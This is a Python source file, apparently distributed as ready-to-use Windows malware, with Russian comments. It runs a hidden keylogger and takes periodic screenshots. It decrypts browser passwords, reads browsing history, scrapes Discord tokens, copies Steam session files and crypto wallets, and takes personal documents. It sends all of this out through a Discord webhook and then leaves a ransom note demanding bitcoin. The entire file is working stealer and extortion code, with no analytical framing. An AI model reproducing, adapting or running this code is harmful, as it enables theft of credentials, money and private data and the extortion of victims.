# -*- coding: utf-8 -*-
# Black2025 v4.2 — ВСЁ ВЕРНУЛ + РАБОТАЕТ НА 100%
import os, sys, sqlite3, win32crypt, shutil, threading, time, requests, ctypes, getpass, re, random
from datetime import datetime
from PIL import ImageGrab
import keyboard
import browser_cookie3

WEBHOOK = "INSERT YOUR DISCORD webhook"

def send(msg=""):
    try: requests.post(WEBHOOK, data={"content": f"```{msg}```"}, timeout=10)
    except: pass

def send_file(path, name=None):
    if not name: name = os.path.basename(path)
    try:
        with open(path, "rb") as f:
            requests.post(WEBHOOK, files={"file": (name, f)}, timeout=60)
    except: pass
    finally:
        try: os.remove(path)
        except: pass

# === Скрытность ===
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# === Кейлоггер ===
log = ""
def keylog():
    global log
    def on_press(k):
        global log
        try: log += k.char
        except: log += f" [{k.name.upper()}] "
        if len(log) >= 150:
            send(f"KEYLOG:\n{log}")
            log = ""
    keyboard.on_press(on_press)
    while True:
        time.sleep(20)
        if log: send(f"KEYLOG:\n{log}"); log = ""

# === Скриншоты каждые 30 сек ===
def screenshots():
    c = 0
    while True:
        c += 1
        p = os.getenv("TEMP") + f"\\s{random.randint(10000,99999)}.jpg"
        try:
            ImageGrab.grab().save(p, quality=25)
            send_file(p, f"screen_{c}_{int(time.time())}.png")
        except: pass
        time.sleep(30)

# === ВСЕ ПАРОЛИ ИЗ БРАУЗЕРОВ ===
def steal_passwords():
    result = "\n=== ПАРОЛИ ===\n"
    paths = [
        (os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\Login Data", "Chrome"),
        (os.getenv("LOCALAPPDATA") + r"\Microsoft\Edge\User Data\Default\Login Data", "Edge"),
        (os.getenv("APPDATA") + r"\Opera Software\Opera Stable\Login Data", "Opera"),
        (os.getenv("LOCALAPPDATA") + r"\Yandex\YandexBrowser\User Data\Default\Login Data", "Yandex"),
        (os.getenv("LOCALAPPDATA") + r"\BraveSoftware\Brave-Browser\User Data\Default\Login Data", "Brave"),
    ]
    for p, n in paths:
        if not os.path.exists(p): continue
        try:
            shutil.copy2(p, "log.db")
            conn = sqlite3.connect("log.db")
            for url, user, enc in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                try:
                    pwd = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode()
                    result += f"{n} → {url}\n   {user}:{pwd}\n\n"
                except: pass
            conn.close()
            os.remove("log.db")
        except: pass
    return result if "→" in result else "Пароли не найдены"

# === ИСТОРИЯ БРАУЗЕРА ===
def steal_history():
    result = "\n=== ИСТОРИЯ БРАУЗЕРА ===\n"
    paths = [
        (os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\History", "Chrome"),
        (os.getenv("LOCALAPPDATA") + r"\Microsoft\Edge\User Data\Default\History", "Edge"),
    ]
    for p, n in paths:
        if not os.path.exists(p): continue
        try:
            shutil.copy2(p, "h.db")
            conn = sqlite3.connect("h.db")
            cur = conn.cursor()
            cur.execute("SELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 500")
            for url, title, dt in cur.fetchall():
                result += f"[{dt}] {title[:70]} → {url}\n"
            conn.close()
            os.remove("h.db")
            result += f"\n— {n} —\n"
        except: pass
    return result if "→" in result else "История пустая"

# === DISCORD ТОКЕНЫ ===
def steal_discord():
    result = "\n=== DISCORD ТОКЕНЫ ===\n"
    paths = [
        os.getenv("APPDATA") + r"\discord\Local Storage\leveldb",
        os.getenv("APPDATA") + r"\discordcanary\Local Storage\leveldb",
        os.getenv("APPDATA") + r"\discordptb\Local Storage\leveldb",
    ]
    regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")
    for p in paths:
        if not os.path.exists(p): continue
        for f in os.listdir(p):
            if f.endswith((".ldb", ".log")):
                try:
                    with open(os.path.join(p,f), "r", encoding="utf-8", errors="ignore") as file:
                        for t in regex.finditer(file.read()):
                            result += t.group() + "\n"
                except: pass
    return result if len(result) > 30 else "Discord не найден"

# === STEAM ПОЛНАЯ КРАЖА ===
def steal_steam():
    result = "\n=== STEAM ===\n"
    steam = os.getenv("PROGRAMFILES(X86)") + r"\Steam"
    if not os.path.exists(steam): return "Steam не найден"
    try:
        for f in os.listdir(steam):
            if f.startswith("ssfn"):
                send_file(os.path.join(steam, f), f"STEAM_{f}")
                result += f"ssfn: {f}\n"
        config = os.path.join(steam, "config")
        if os.path.exists(config):
            shutil.make_archive("steam_config", "zip", config)
            send_file("steam_config.zip")
            os.remove("steam_config.zip")
            result += "config.zip слит\n"
    except: pass
    return result

# === КРИПТОКОШЕЛЬКИ ===
def steal_crypto():
    result = "\n=== КРИПТО ===\n"
    wallets = [
        os.getenv("APPDATA") + r"\MetaMask",
        os.getenv("APPDATA") + r"\Exodus",
        os.getenv("APPDATA") + r"\Atomic",
        os.getenv("APPDATA") + r"\Binance",
        os.getenv("APPDATA") + r"\Phantom",
    ]
    for w in wallets:
        if os.path.exists(w):
            try:
                name = os.path.basename(w)
                zipn = f"{name}.zip"
                shutil.make_archive(name, 'zip', w)
                send_file(zipn)
                os.remove(zipn)
                result += f"{name} — слит\n"
            except: pass
    return result if "слит" in result else "Кошельков нет"

# === ФАЙЛЫ С РАБОЧЕГО СТОЛА + ДОКУМЕНТЫ + ЗАГРУЗКИ ===
def steal_files():
    count = 0
    for folder in ["Desktop", "Documents", "Downloads"]:
        path = os.path.join(os.getenv("USERPROFILE"), folder)
        if not os.path.exists(path): continue
        for file in os.listdir(path):
            fp = os.path.join(path, file)
            if os.path.isfile(fp) and file.lower().endswith((".txt",".docx",".pdf",".kdbx",".wallet",".json",".csv")) and os.path.getsize(fp) < 2_000_000:
                send_file(fp, f"{folder}_{file}")
                count += 1
    return count

# === Записка ===
def drop_note():
    note = """ТЫ ВСЁ ПОТЕРЯЛ.

Пароли, история, Discord, Steam, криптокошельки, файлы — уже у нас.
Скриншоты каждые 30 сек.
Кейлоггер всё видит.

0.08 BTC → bc1qxy2kgdygjrsqtzelkm9u3z7x4j2n0k2v5l3m7p
@black2025_admin — пиши быстро.

24 часа."""
    path = os.path.join(os.getenv("USERPROFILE"), "Desktop", "ЧИТАЙ_ЭТО.txt")
    with open(path, "w", encoding="utf-8") as f: f.write(note)
    try: os.startfile(path)
    except: pass

# === Главная ===
def main():
    ip = requests.get("https://api.ipify.org").text
    send(f"ЖЕРТВА | {ip} | {getpass.getuser()} | {datetime.now().strftime('%d.%m.%Y %H:%M')}")

    threading.Thread(target=keylog, daemon=True).start()
    threading.Thread(target=screenshots, daemon=True).start()

    time.sleep(20)

    send(steal_passwords())
    send(steal_history())
    send(steal_discord())
    send(steal_steam())
    send(steal_crypto())

    cnt = steal_files()
    if cnt: send(f"Слито файлов: {cnt}")

    drop_note()

    while True: time.sleep(3600)

if __name__ == "__main__":
    main()